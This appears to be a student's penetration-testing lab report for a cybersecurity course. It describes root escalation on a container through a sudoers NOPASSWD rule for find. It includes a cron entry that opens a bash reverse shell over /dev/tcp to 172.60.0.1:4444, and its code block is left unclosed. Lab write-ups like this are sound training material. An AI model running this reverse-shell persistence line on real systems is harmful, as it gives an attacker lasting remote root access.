# Penetration Testing & Escalation Analysis: Bastion Web Infrastructure

**Author:** tpetgrave12  
**Course:** Cybersecurity Foundations Intensive  
**Date:** May 30, 2026  
**Target Environment:** Bastion Web Server Container (172.60.0.10)  

---

## Phase 1: Privilege Escalation
* **Vector Identified:** Misconfigured `/etc/sudoers` entry permitting the low-privilege account `mercenary` to execute the system utility `/usr/bin/find` as root without a password specification (`NOPASSWD`).
* **Verification Command Output (`whoami`):**
```text
root
* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.60.0.1/4444 0>&1'
